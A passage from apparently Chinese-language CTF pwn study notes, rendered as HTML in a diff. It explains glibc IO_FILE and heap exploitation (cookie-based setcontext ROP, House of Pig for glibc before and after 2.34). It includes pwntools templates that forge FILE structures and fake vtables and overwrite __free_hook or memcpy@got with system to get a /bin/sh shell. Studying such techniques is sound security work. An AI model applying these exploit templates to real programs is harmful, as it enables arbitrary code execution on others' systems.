+</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kr">inline</span> <span class="kt">int</span>
+</span></span><span class="line"><span class="cl"><span class="nf">outstring_func</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">s</span><span class="p">,</span> <span class="k">const</span> <span class="n">UCHAR_T</span> <span class="o">*</span><span class="n">string</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">length</span><span class="p">,</span> <span class="kt">int</span> <span class="n">done</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">assert</span> <span class="p">((</span><span class="n">size_t</span><span class="p">)</span> <span class="n">done</span> <span class="o">&lt;=</span> <span class="p">(</span><span class="n">size_t</span><span class="p">)</span> <span class="n">INT_MAX</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">((</span><span class="n">size_t</span><span class="p">)</span> <span class="n">PUT</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">string</span><span class="p">,</span> <span class="n">length</span><span class="p">)</span> <span class="o">!=</span> <span class="p">(</span><span class="n">size_t</span><span class="p">)</span> <span class="p">(</span><span class="n">length</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">done_add_func</span> <span class="p">(</span><span class="n">length</span><span class="p">,</span> <span class="n">done</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>此时调用PUT实际调用了<code>_IO_cookie_write</code>，调用后write指向加密后的setcontext中转gadget，参数<code>_cookie</code>为伪造的<code>SigreturnFrame</code>地址处</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">call qword ptr [rbx + 0x38] ; _IO_cookie_write
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>接着解密write指针值，获取到中转gadget地址，进入后最终<code>call &lt;setcontext+offset</code>，设置寄存器后栈迁移到堆上进行ORW_ROP</p>
+<p><strong>模板</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># _IO_read_end</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># _IO_read_base</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># _IO_write_base</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># _IO_write_ptr</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># _IO_write_end</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># _IO_buf_base;</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># _IO_buf_end should usually be (_IO_buf_base + 1)</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">4</span>  <span class="c1"># from _IO_save_base to _markers</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># the FILE chain ptr</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>  <span class="c1"># _fileno for stderr is 2</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># _flags2, usually 0</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xFFFFFFFFFFFFFFFF</span><span class="p">)</span>  <span class="c1"># _old_offset, -1</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># _cur_column</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span>  <span class="c1"># _vtable_offset</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span>  <span class="c1"># _shortbuf[1]</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># padding</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;_IO_2_1_stdout_&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x1ea0</span><span class="p">)</span>  <span class="c1"># _IO_stdfile_1_lock</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xFFFFFFFFFFFFFFFF</span><span class="p">)</span>  <span class="c1"># _offset, -1</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># _codecvt, usually 0</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;_IO_2_1_stdout_&#39;</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x160</span><span class="p">)</span>  <span class="c1"># _IO_wide_data_1</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">3</span>  <span class="c1"># from _freeres_list to __pad5</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xFFFFFFFF</span><span class="p">)</span>  <span class="c1"># _mode, usually -1</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span> <span class="o">*</span> <span class="mi">19</span>  <span class="c1"># _unused2</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">=</span> <span class="n">fake_file</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0xD8</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>  <span class="c1"># adjust to vtable</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># fake vtable call [reg + xx] 如图调整偏移</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;_IO_cookie_jumps&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x40</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl"><span class="c1"># 继承增加内容</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">frame_addr</span><span class="p">)</span> <span class="c1"># __cookie</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># read</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 利用setcontext中转相关的gadget的地址与file_addr异或，类似于与pointer_guard异或，然后循环左移</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rol</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">&#39;mov rdx, [rdi+0x8]; mov [rsp], rax; call qword ptr [rdx+0x20]&#39;</span><span class="p">),</span> <span class="n">executable</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="fm">__next__</span><span class="p">()</span> <span class="o">^</span> <span class="n">file_addr</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">))</span>  <span class="c1"># write</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># seek</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># close</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="house-of-pig">House of Pig</h4>
+<p>适用于calloc分配内存情况，当tcache中有chunk，仍会从fastbin或small bin等中拿chunk</p>
+<h5 id="glibc234">glibc&lt;2.34</h5>
+<ul>
+<li>利用 tcache stash unlink 与 largebin attack 劫持<code>_IO_list_all</code>然后伪造IO_FILE结构体</li>
+<li>劫持<code>vtable</code>到<code>_IO_str_jumps</code>上，程序退出利用<code>_IO_str_overflow</code>的<code>malloc</code>完成攻击</li>
+<li>以及<code>memcpy</code>在<code>__free_hook</code>处写入system地址，利用free获取shell</li>
+</ul>
+<p>为让 <code>_IO_flush_all_lockp</code> 能调用执行到 <code>_IO_OVERFLOW</code> 从而调用 <code>_IO_str_overflow</code> ，需要满足：</p>
+<ul>
+<li><code>fp-&gt;_mode &lt;= 0</code>以及<code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code></li>
+</ul>
+<p><strong>利用</strong></p>
+<p>① 泄露堆地址、libc地址</p>
+<p>② 将一个 chunk 释放进入 large bin ，利用 large bin attack 将<code>_IO_list_all</code>指向该 chunk 以及将<code>__free_hook-0x8</code>指向该 chunk</p>
+<p>③ 向 tcache bin 放入5个 chunk，通过计算(2*(_IO_buf_end - _IO_buf_base) + 100 = 0x94)来作为大小</p>
+<p>④ 向 small bin 中放入2个 chunk，修改 bk 指向<code>__free_hook - 0x20</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x418</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mh">0x418</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="c1"># chunk1, 3 进入 unsorted bin 中</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 其中一个 chunk 切割后进入unsorted bin中，另一个chunk 进入large bin中</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x420</span> <span class="o">-</span> <span class="mh">0xa0</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl"><span class="c1"># large bin中chunk切割后进入unsroted bin中，unsorted bin中chunk进入small bin</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mh">0x420</span> <span class="o">-</span> <span class="mh">0xa0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># unsorted bin 中 chunk 进入 small bin中</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mh">0xa0</span><span class="p">)</span> 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/img/pwn_note.zh-cn.assets/image-20250122210010100.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250122210010100"
+	
+	
+></p>
+<p>⑤ 申请一个chunk触发tcache stash unlink，使得tcache 直接指向<code>__free_hook-0x10</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="mh">0x94</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>​	<img src="/img/pwn_note.zh-cn.assets/image-20250122210209656.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250122210209656"
+	
+	
+></p>
+<p>⑥ 伪造chunk，最终退出exit触发</p>
+<p><strong>调用过程</strong></p>
+<ul>
+<li>退出触发<code>_IO_flush_all_lockp</code>-&gt;<code>_IO_str_overflow</code>
+<ul>
+<li><code>new_buf = malloc (new_size)</code>将会从tcache中申请出包含<code>__free_hook</code>的chunk</li>
+<li><code>memcpy (new_buf, old_buf, old_blen)</code>将伪造的<code>_IO_buf_base</code>处拷贝到chunk中</li>
+<li>此时<code>__free_hook</code>被覆盖为<code>system</code>，old_buf处为<code>'/bin/sh'</code></li>
+<li><code>free (old_buf)</code>释放时相当于调用system函数，old_buf中为参数<code>/bin/sh</code>，获取shell</li>
+</ul>
+</li>
+</ul>
+<p><img src="/img/pwn_note.zh-cn.assets/image-20250122211820980.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250122211820980"
+	
+	
+></p>
+<p><strong>模板</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">fake_file_addr</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x6d0</span>
+</span></span><span class="line"><span class="cl"><span class="n">n64</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="p">(</span><span class="n">x</span> <span class="o">+</span> <span class="mh">0x10000000000000000</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFFFFFFFFFF</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># _IO_read_end</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># _IO_read_base</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>  <span class="c1"># _IO_write_base</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">n64</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">))</span>  <span class="c1"># _IO_write_ptr</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># _IO_write_end</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_file_addr</span> <span class="o">+</span> <span class="mh">0xe0</span><span class="p">)</span>  <span class="c1"># _IO_buf_base;</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_file_addr</span> <span class="o">+</span> <span class="mh">0xe0</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">*</span> <span class="mi">3</span><span class="p">)</span>  <span class="c1"># _IO_buf_end should usually be (_IO_buf_base + 1)</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">4</span>  <span class="c1"># from _IO_save_base to _markers</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;_IO_2_1_stdout_&#39;</span><span class="p">])</span>  <span class="c1"># the FILE chain ptr</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>  <span class="c1"># _fileno for stderr is 2</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># _flags2, usually 0</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xFFFFFFFFFFFFFFFF</span><span class="p">)</span>  <span class="c1"># _old_offset, -1</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># _cur_column</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span>  <span class="c1"># _vtable_offset</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span>  <span class="c1"># _shortbuf[1]</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># padding</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;_IO_2_1_stdout_&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x1ea0</span><span class="p">)</span>  <span class="c1"># _IO_stdfile_1_lock</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xFFFFFFFFFFFFFFFF</span><span class="p">)</span>  <span class="c1"># _offset, -1</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># _codecvt, usually 0</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;_IO_2_1_stdout_&#39;</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x160</span><span class="p">)</span>  <span class="c1"># _IO_wide_data_1</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">3</span>  <span class="c1"># from _freeres_list to __pad5</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xFFFFFFFF</span><span class="p">)</span>  <span class="c1"># _mode, usually -1</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span> <span class="o">*</span> <span class="mi">19</span>  <span class="c1"># _unused2</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">=</span> <span class="n">fake_file</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0xD8</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>  <span class="c1"># adjust to vtable</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">IO_str_jumps</span><span class="p">)</span>  <span class="c1"># fake vtable</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">])</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h5 id="glibc233">glibc&gt;2.33</h5>
+<ul>
+<li>glibc-2.34 起取消了 ptmalloc 中各种 hook，<code>_IO_str_overflow</code>中<code>memcpy</code>实际通过got表调用</li>
+<li>构造多个<code>_IO_FILE</code>链将<code>memcpy@got</code>改写成<code>&amp;system</code>，调用memcpy获取shell</li>
+<li>通过gdb命令<code>u _IO_str_overflow</code>中<code>call *ABS*+0xabc@plt</code>指令所在地址中实际call的地址0xbcd，<code>u 0xbcd</code>中<code>bnd jmp qword ptr [rip + offset]</code>找到的地址处找到memcpy@got表地址</li>
+</ul>
+<p><strong>利用</strong></p>
+<p><img src="/img/pwn_note.zh-cn.assets/image-20250123202353253.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250123202353253"
+	
+	
+></p>
+<ul>
+<li>泄露libc基址、堆地址，将chunk 2：fake_file1 置入 largebin 中</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x418</span><span class="p">)</span> <span class="c1"># fake_file2</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x288</span><span class="p">)</span> <span class="c1"># fake tcache_pthread_struct</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x428</span><span class="p">)</span> <span class="c1"># fake_file1</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mh">0x418</span><span class="p">)</span> <span class="c1"># fake_file3</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mh">0x418</span><span class="p">)</span> <span class="c1"># fake_file4</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">)</span> <span class="c1"># memcpy data: /bin/sh, system</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x418</span><span class="p">)</span> <span class="c1"># chunk2 进入 large bin</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>large bin attack 将<code>_IO_list_all</code> 修改为 chunk 2的地址，此时，编辑fake_file1，将其<code>_IO_buf_base</code>指向<code>tcache_perthread_struct</code>，且<code>_chain</code>指向fake_file2</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
